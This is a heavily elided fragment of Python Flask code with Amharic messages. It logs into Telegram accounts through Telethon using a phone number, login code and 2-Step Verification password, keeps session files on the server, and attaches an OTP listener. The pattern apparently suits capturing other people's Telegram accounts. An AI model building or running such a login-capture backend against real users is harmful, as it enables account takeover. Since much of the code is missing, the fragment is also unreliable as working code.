...
verifying_in_progress = set()  # ድግግሞሽን ለመከላከል
...
def send_code():
    ...
    if not phone:
        return jsonify({'success': False, 'message': 'እባክዎ ስልክ ቁጥር ያስገቡ'})

    async def async_send():
        clean_phone = phone.replace("+", "").strip()
        client = TelegramClient(f'session_{clean_phone}', API_ID, API_HASH)
        ...
        return {'success': True, 'message': 'ኮድ ተልኳል!'}
...
def verify_code():
    ...
    # አንድ ስልክ ቁጥር በሂደት ላይ እያለ ሁለተኛ ጥያቄ እንዳይቀበል ይከላከላል (Duplicate መከላከያ)
    if phone in verifying_in_progress:
        return jsonify({'success': False, 'message': 'ሂደት ላይ ነው፣ እባክዎ ትንሽ ይጠብቁ...'})

    if phone not in active_sessions:
        return jsonify({'success': False, 'message': 'ክፍለ ጊዜው አልቋል. እባክዎ እንደገና ይሞክሩ።'})

    verifying_in_progress.add(phone)
        ...
        try:
            ...
            async def otp_listener(event):
                try:
                    ...
                    print("OTP Listener error:", listener_err)

            if phone in active_sessions:
                del active_sessions[phone]

            return {'success': True, 'message': 'በተሳካ ሁኔታ ተገናኝቷል!'}
        
        finally:
            if phone in verifying_in_progress:
                verifying_in_progress.remove(phone)
    ...
    try:
        ...
        if phone in verifying_in_progress:
            verifying_in_progress.remove(phone)
        return jsonify({'success': False, 'message': 'እባክዎ የቴሌግራም 2-Step Verification ፓስዎርድ ያስገቡ'})
    except Exception as e:
        if phone in verifying_in_progress:
            verifying_in_progress.remove(phone)
